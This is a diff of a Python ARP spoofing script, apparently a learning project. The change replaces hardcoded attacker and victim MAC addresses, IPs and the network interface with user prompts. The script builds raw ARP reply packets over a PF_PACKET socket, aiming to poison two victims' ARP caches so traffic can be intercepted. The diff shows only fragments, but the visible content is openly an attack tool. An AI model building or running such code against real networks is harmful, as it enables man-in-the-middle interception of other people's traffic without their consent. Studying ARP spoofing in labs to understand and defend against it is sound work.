@@ -12,13 +12,18 @@ import socket
 # The third parameter determines the protocol we want to use. 0x0800 is IP
 s = socket.socket(socket.PF_PACKET, socket.SOCK_RAW, socket.htons(0x0800))
 
-# I am not sure which interface should be used. It seems like you would need two, one for each target?
-s.bind(("eth0", socket.htons(0x0800)))
+# Get desired interface from the user
+intf = input("Enter the desired interface: ")
 
-# MAC addresses of involved machines. I might set these up as something the user can input
-attackmac = '\x00\x0c\x29\x4f\x8e\76'
-victim1mac = '\x00\x0c\x29\x2E\x84\x5A'
-victim2mac = '\x00\x50\x56\xC0\x00\x28'
+# I am not sure which interface should be used. It seems like you would need two, one for each target?
+s.bind((intf, socket.htons(0x0800)))
+
+# MAC addresses of involved machines
+# Formatting example: '\x00\x0c\x29\x4f\x8e\76'
+attackmac = input("Enter the Attacker's MAC address: ")
+victim1mac = input("Enter Victim 1's MAC address: ")
+victim2mac = input("Enter Victim 2's MAC address: ")
+
 
 # This code identifies that we are using ARP protocol
 code = '\x08\x06'
@@ -34,9 +39,10 @@ hsize = '\x06'  # Hardware length: Ethernet address length is 0x06 octets for th
 psize = '\x04'  # Protocol length: IPv4 is 0x04
 opcode = '\x00\x02'  # Operation code: is this a REQUEST (0x0001) or REPLY (0x0002)
 
-# IP addresses of involved machines.  I might set these up as something the user can input
-victim1_ip = '192.168.43.85'
-victim2_ip = '192.168.43.131'
+# IP addresses of involved machines
+# Formatting example: '192.168.43.85'
+victim1_ip = input("Enter Victim 1's IP address: ")
+victim2_ip = input("Enter Victim 2's IP address: ")
 
 # Convert IP addresses into Hex
 victim1ip = socket.inet_aton(victim1_ip)
